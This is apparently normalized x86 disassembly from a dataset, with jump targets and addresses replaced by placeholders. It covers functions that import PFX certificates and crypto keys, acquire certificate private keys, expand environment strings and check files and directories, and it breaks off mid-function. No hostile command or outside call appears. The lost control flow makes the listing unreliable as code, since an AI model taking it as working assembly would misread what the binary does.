mov [ ebp - 0x2c ] eax
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x3c ]
push 0x8
push eax
lea ecx [ ebp - 0x28 ]
call sub_10005470
push 0xc
lea eax [ ebp - 0x34 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_10005470
cmp [ ebp + 0x1c ] 0x10
lea ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x18 ]
lea edi [ ebp + 0x8 ]
cmovae ecx [ ebp + 0x8 ]
add eax ecx
cmp [ ebp + 0x1c ] 0x10
cmovae edi [ ebp + 0x8 ]
cmp edi eax
je r-xdata
push 0xffffffff
push 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_100050b0
cmp [ ebp - 0x14 ] 0x10
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x0
push [ ebp - 0x18 ]
lea ecx [ ebp - 0x28 ]
cmovae ecx [ ebp - 0x28 ]
push ecx
push [ ebx + 0xc ]
call [ CryptImportKey@IAT ]
cmp eax 0x1
je r-xdata
dec eax
cmp edi eax
je r-xdata
mov esi 0x1
call [ GetLastError@IAT ]
xor esi esi
jmp r-xdata
mov dl [ edi ]
mov cl [ eax ]
mov [ edi ] cl
inc edi
mov [ eax ] dl
cmp edi eax
jne r-xdata
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
mov [ ebp + 0x1c ] 0xf
mov eax esi
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x1c
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100077c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c388
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x8 ]
cmp [ ebp + 0x1c ] 0x10
push 0x0
cmovae eax [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push r--data
push eax
call [ PFXImportCertStore@IAT ]
mov [ esi + 0x1c ] eax
test eax eax
je r-xdata
xor esi esi
push 0x0
push eax
call [ CertEnumCertificatesInStore@IAT ]
mov [ esi + 0x20 ] eax
test eax eax
jne r-xdata
mov [ ebp + 0x1c ] 0xf
mov eax esi
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x1c
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
cmp [ ebp + 0x20 ] 0x0
je r-xdata
push eax
push [ esi + 0x1c ]
call [ CertCloseStore@IAT ]
mov [ esi + 0x1c ] 0x0
mov esi 0x1
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x10 ] 0x0
push ecx
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] 0x0
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] 0x0
push ecx
push 0x0
push 0x40
push eax
call [ CryptAcquireCertificatePrivateKey@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
lea eax [ esi + 0x10 ]
push eax
push [ ebp - 0x18 ]
push [ ebp - 0x10 ]
call [ CryptGetUserKey@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ esi + 0x24 ] eax
push 0x0
push [ ebp - 0x10 ]
call [ CryptReleaseContext@IAT ]
jmp r-xdata
sub_10007910
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c3b8
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
add ecx 0x4c
lea eax [ ebp + 0x8 ]
cmp ecx eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x18
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10007990
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c401
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
xor eax eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] esi
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov [ ebp - 0x4 ] eax
mov ebx [ InterlockedExchange@IAT ]
mov [ ebp - 0x34 ] 0x1
cmp [ ebp + 0x10 ] eax
je r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x30 ] 0x0
push eax
push 0x400
push [ ebp + 0xc ]
push 0x0
push 0x1300
call [ FormatMessageW@IAT ]
mov edx [ ebp - 0x30 ]
test edx edx
je r-xdata
cmp [ rw-data ] eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx edx
xor edi edi
lea ebx [ ecx + 0x2 ]
mov edx [ rw-data ]
cmp [ edx ] 0x0
jne r-xdata
lea ecx [ eax + 0x2 ]
call sub_100383b0
push eax
push rw-data
call ebx
test edx edx
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx ebx
sar ecx 0x1
je r-xdata
mov ecx edx
lea edi [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
xor eax eax
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x2c ] ax
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x2c ]
cmp esi eax
je r-xdata
mov edx [ rw-data ]
cmp [ edx ] 0x0
jne r-xdata
mov ecx 0x3
call sub_100383b0
push eax
push rw-data
call ebx
cmp [ edx ] 0x0
jne r-xdata
movzx eax [ edx + edi * 2 ]
cmp eax 0xa
je r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edi
sar ecx 0x1
push ecx
push edx
mov ecx esi
call sub_10005dc0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx edx
lea edi [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
mov ecx edx
lea edi [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
xor eax eax
mov [ edx + edi * 2 ] ax
mov edx [ ebp - 0x30 ]
cmp eax 0xd
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] ax
push [ ebp - 0x2c ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov ecx esi
mov [ esi ] ax
lea eax [ ebp - 0x2c ]
push eax
call sub_10003980
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edi
sar ecx 0x1
push ecx
push edx
mov ecx esi
call sub_10005dc0
mov edx [ ebp - 0x30 ]
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edi
sar ecx 0x1
push ecx
push edx
mov ecx esi
call sub_10005dc0
push [ ebp - 0x30 ]
call [ LocalFree@IAT ]
mov edx [ ebp - 0x30 ]
mov ebx [ InterlockedExchange@IAT ]
mov ecx edx
inc edi
lea ebx [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx ebx
sar ecx 0x1
cmp edi ecx
jb r-xdata
jmp r-xdata
sub_10007be0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c459
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
mov eax [ ebp + 0x18 ]
mov edx 0x2
lea esi [ eax * 2 + 0x209 ]
add esi eax
mov eax esi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_1003c61a
mov ebx eax
lea eax [ esi + esi ]
push eax
push 0x0
push ebx
call sub_10045ec0
add esp 0x10
mov [ edi + 0x14 ] 0x7
xor eax eax
mov [ edi + 0x10 ] 0x0
mov [ edi ] ax
mov ecx edi
push 0xffffffff
push eax
lea eax [ ebp + 0x8 ]
push eax
call sub_10003a20
cmp [ ebp + 0x1c ] 0x8
lea eax [ esi - 0x1 ]
push eax
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x2c ] 0x1
cmovae ecx [ ebp + 0x8 ]
push ebx
push ecx
call [ ExpandEnvironmentStringsW@IAT ]
test eax eax
je r-xdata
push ebx
call j_sub_1003f3e3
add esp 0x4
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] ax
cmp [ ebx ] ax
je r-xdata
xor eax eax
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] ax
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
push eax
push ebx
lea ecx [ ebp - 0x28 ]
call sub_10009730
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp - 0x28 ]
cmp edi eax
je r-xdata
mov eax ebx
lea edx [ eax + 0x2 ]
lea ecx [ ecx ]
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x14 ] 0x8
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
xor eax eax
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] ax
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov ecx edi
mov [ edi ] ax
lea eax [ ebp - 0x28 ]
push eax
call sub_10003980
push [ edi ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10007da0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c49b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov ecx [ edi ]
mov ecx [ ecx + 0x8 ]
add ecx edi
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov [ ebp - 0x4 ] 0xffffffff
sub esp 0x18
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ ebp + 0x8 ] esp
mov [ esi + 0x10 ] 0x4
push 0x0
push ecx
push eax
mov [ esi + 0x14 ] ecx
call sub_10007990
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2c ]
call sub_1003c1b0
add esp 0x18
mov [ ebp - 0x4 ] 0x2
lea ecx [ esi + 0x4c ]
lea eax [ ebp - 0x2c ]
cmp ecx eax
je r-xdata
mov eax [ esi ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
mov eax [ eax + 0x8 ]
add eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push [ ebp - 0x2c ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10007eb0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004c4d3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x10 ] esi
mov [ esp + 0x38 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov ecx [ edi ]
mov ecx [ ecx + 0x8 ]
add ecx edi
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov esi eax
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x8 ]
add eax esi
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
cmp [ edx ] 0x0
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x14 ] 0x0
jne r-xdata
mov [ esp + 0x38 ] 0xffffffff
mov edx [ ebp + 0x8 ]
mov [ esi + 0x10 ] 0x31
test edx edx
je r-xdata
mov ecx edx
lea edi [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
push ecx
push edx
lea ecx [ esp + 0x1c ]
call sub_100019e0
mov [ esp + 0x38 ] 0x1
lea ecx [ esi + 0x4c ]
lea eax [ esp + 0x14 ]
cmp ecx eax
je r-xdata
mov [ esp + 0x38 ] 0xffffffff
cmp [ esp + 0x28 ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x14 ] 0x0
push [ esp + 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10007ff0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c4f8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x258
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x264 ]
cmp [ ebp + 0x20 ] 0x8
lea eax [ ebp + 0xc ]
push ecx
cmovae eax [ ebp + 0xc ]
push eax
call [ FindFirstFileW@IAT ]
mov edx eax
cmp edx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x264 ]
shr ecx 0x4
mov eax ecx
mov [ esi ] 0x1
not eax
and ecx 0x1
and eax 0x1
mov [ esi + 0x8 ] ecx
push edx
mov [ esi + 0x4 ] eax
call [ FindClose@IAT ]
mov esi 0x1
xor esi esi
jmp r-xdata
xor eax eax
mov [ ebp + 0x20 ] 0x7
mov [ ebp + 0xc ] ax
mov eax esi
mov [ ebp + 0x1c ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x1c
push [ ebp + 0xc ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x20 ] 0x8
jb r-xdata
sub_100080c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c54f
mov eax [ fs : 0x0 ]
push eax
mov eax 0x8074
call sub_10048ab0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ edi ] r--data
mov [ edi + 0x20 ] 0x7
mov [ edi + 0x1c ] 0x0
mov [ ebp - 0x807c ] edi
mov [ edi + 0xc ] ax
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x8078 ]
mov [ edi + 0x8 ] eax
mov [ edi + 0x4 ] esi
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x8030 ]
push 0x8020
push 0x0
push eax
call sub_10045ec0
add esp 0xc
lea eax [ ebp - 0x8030 ]
push eax
push 0x400f
call [ GetCurrentDirectoryW@IAT ]
cmp [ ebp - 0x8030 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x8030 ]
lea edx [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0x8030 ]
push eax
lea ecx [ edi + 0xc ]
call sub_10009730
mov eax [ esi ]
lea ecx [ ebp - 0x8060 ]
push ecx
mov ecx esi
call [ eax + 0x14 ]
mov edx eax
mov [ ebp - 0x4 ] 0x2
cmp [ edx + 0x14 ] 0x8
jb r-xdata
sub esp 0x18
xor eax eax
mov esi esp
mov [ ebp - 0x8080 ] esp
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
cmp [ edx ] ax
jne r-xdata
mov edx [ edx ]
mov ecx edx
lea ebx [ ecx + 0x2 ]
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
push ecx
push edx
mov ecx esi
call sub_10009730
mov [ ebp - 0x4 ] 0x3
lea eax [ ebp - 0x8048 ]
push [ ebp + 0xc ]
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
mov ecx edi
call sub_100090e0
cmp [ ebp - 0x8034 ] 0x8
jb r-xdata
sub ecx ebx
sar ecx 0x1
xor eax eax
mov [ ebp - 0x8034 ] 0x7
mov [ ebp - 0x8038 ] 0x0
mov [ ebp - 0x8048 ] ax
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x804c ] 0x8
jb r-xdata
push [ ebp - 0x8048 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp - 0x804c ] 0x7
mov [ ebp - 0x8050 ] 0x0
mov [ ebp - 0x8060 ] ax
mov [ ebp - 0x4 ] al
cmp [ ebp - 0x8064 ] 0x8
jb r-xdata
push [ ebp - 0x8060 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp - 0x8064 ] 0x7
mov [ ebp - 0x8068 ] 0x0
mov [ ebp - 0x8078 ] ax
mov [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x8
push [ ebp - 0x8078 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100082e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c58b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x1c ] 0x0
jbe r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x20 ] 0x8
jb r-xdata
cmp [ esi + 0x20 ] 0x8
lea eax [ esi + 0xc ]
jb r-xdata
xor eax eax
mov [ esi + 0x20 ] 0x7
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x1c ] 0x0
mov [ esi + 0xc ] ax
je r-xdata
push [ esi + 0xc ]
call j_sub_1003f3e3#2
add esp 0x4
push eax
call [ SetCurrentDirectoryW@IAT ]
mov eax [ eax ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10008380
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c58b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x1c ] 0x0
jbe r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x20 ] 0x8
jb r-xdata
cmp [ esi + 0x20 ] 0x8
lea eax [ esi + 0xc ]
jb r-xdata
xor eax eax
mov [ esi + 0x20 ] 0x7
mov [ esi + 0x1c ] 0x0
mov [ esi + 0xc ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0xc ]
call j_sub_1003f3e3#2
add esp 0x4
push eax
call [ SetCurrentDirectoryW@IAT ]
mov eax [ eax ]
sub_10008410
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c5cb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x0
push 0x94
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
xor esi esi
push ecx
push edi
push esi
mov ecx eax
call sub_10018c90
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp + 0x24 ] 0x7
mov [ ebp + 0x10 ] ax
mov eax edi
mov [ ebp + 0x20 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push [ ebp + 0x10 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0x0
sub esp 0x18
mov ecx esp
mov [ ebp - 0x10 ] esp
xor eax eax
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ ebp + 0x10 ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_100190c0
mov eax [ esi ]
mov [ esi + 0x10 ] 0x3
mov edi [ eax + 0x8 ]
add edi esi
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x24 ] 0x8
jb r-xdata
sub_10008500
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c600
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
sub esp 0x18
mov ecx esp
mov [ ebp - 0x10 ] esp
xor eax eax
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ ebp + 0x8 ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
call sub_100085d0
add esp 0x18
test eax eax
je r-xdata
xor esi esi
push ecx
push 0x2
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x10 ] 0x5c
push eax
lea ecx [ ebp + 0x8 ]
call sub_10009600
cmp eax 0xffffffff
je r-xdata
xor eax eax
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x8 ] ax
mov eax esi
mov [ ebp + 0x18 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
mov esi 0x1
jmp r-xdata
mov ecx [ ebp + 0x18 ]
dec ecx
cmp eax ecx
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
sub_100085d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c628
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x18 ] 0x2
jb r-xdata
xor esi esi
mov ecx [ ebp + 0x1c ]
lea eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
cmp ecx 0x8
cmovae eax edx
cmp [ eax ] 0x5c
jne r-xdata
xor eax eax
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x8 ] ax
mov eax esi
mov [ ebp + 0x18 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
cmp ecx 0x8
lea eax [ ebp + 0x8 ]
cmovae eax edx
cmp [ eax + 0x2 ] 0x5c
jne r-xdata
mov esi 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
sub_10008670
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c628
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x18 ] 0x0
jbe r-xdata
xor esi esi
cmp [ ebp + 0x1c ] 0x8
lea eax [ ebp + 0x8 ]
cmovae eax [ ebp + 0x8 ]
cmp [ eax + 0x2 ] 0x3a
jne r-xdata
xor eax eax
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x8 ] ax
mov eax esi
mov [ ebp + 0x18 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
mov esi 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
sub_10008700
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c6d1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x64 ] 0x0
mov [ ebp - 0x4 ] 0x2
xor eax eax
push 0xffffffff
push eax
mov [ ebp - 0x28 ] ax
lea ecx [ ebp - 0x28 ]
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] 0x0
